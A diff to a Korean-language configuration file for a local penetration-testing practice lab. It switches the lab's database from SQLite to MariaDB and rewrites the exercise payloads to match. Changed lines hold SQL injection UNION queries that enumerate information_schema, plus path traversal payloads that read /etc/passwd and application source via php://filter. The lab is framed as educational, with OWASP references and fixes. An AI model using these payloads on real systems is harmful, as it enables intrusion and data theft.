@@ -1,7 +1,7 @@
 {
   "meta": {
     "title": "BLACKOUT 멀티엔진 모의해킹 실습실",
-    "note": "로컬 전용 학습 환경. 모든 DB는 SQLite. 페이로드는 교육용이며 본인이 구동한 로컬 랩에서만 사용할 것.",
+    "note": "로컬 전용 학습 환경. 상용 DB(MariaDB) 기본. 페이로드는 교육용이며 본인이 구동한 로컬 랩에서만 사용할 것.",
     "flag_format": "BLACKOUT{<engine>_<vuln>_<token>}"
   },
   "categories": [
@@ -42,14 +42,14 @@
     },
     {
       "id": 3, "category": "sqli", "difficulty": "medium",
-      "title": "SQL Injection — 스키마 열거 (sqlite_master / pragma)",
+      "title": "SQL Injection — 스키마 열거 (information_schema)",
       "owasp": "A03:2021 Injection",
       "ref": "https://portswigger.net/web-security/sql-injection/examining-the-database",
-      "goal": "SQLite 시스템 테이블로 테이블·컬럼 구조를 알아낸다.",
+      "goal": "MySQL/MariaDB 시스템 뷰(information_schema)로 테이블·컬럼 구조를 알아낸다.",
       "route": "/search?q=",
       "steps": [
-        { "desc": "테이블 목록", "payload": "x' UNION SELECT name, sql, '3' FROM sqlite_master WHERE type='table'-- " },
-        { "desc": "컬럼 목록", "payload": "x' UNION SELECT group_concat(name), '2', '3' FROM pragma_table_info('users')-- " }
+        { "desc": "테이블 목록", "payload": "x' UNION SELECT table_name, table_schema, '3' FROM information_schema.tables WHERE table_schema=database()-- " },
+        { "desc": "컬럼 목록", "payload": "x' UNION SELECT group_concat(column_name), '2', '3' FROM information_schema.columns WHERE table_name='users'-- " }
       ],
       "fix": "파라미터 바인딩 + DB 계정 권한 축소 + 상세 오류 메시지 숨김."
     },
@@ -221,7 +221,7 @@
       "route": "/download?file=",
       "steps": [
         { "desc": "상위 경로 탐색", "payload": "/download?file=../../etc/passwd" },
-        { "desc": "앱 소스/DB 획득", "payload": "/download?file=../app.py 또는 ../blackout.db" }
+        { "desc": "앱 소스 획득", "payload": "/download?file=../lib.php (또는 /theme?name=php://filter...)" }
       ],
       "fix": "경로 정규화 후 기준 디렉터리 포함 여부 검증, 파일명 화이트리스트."
     },
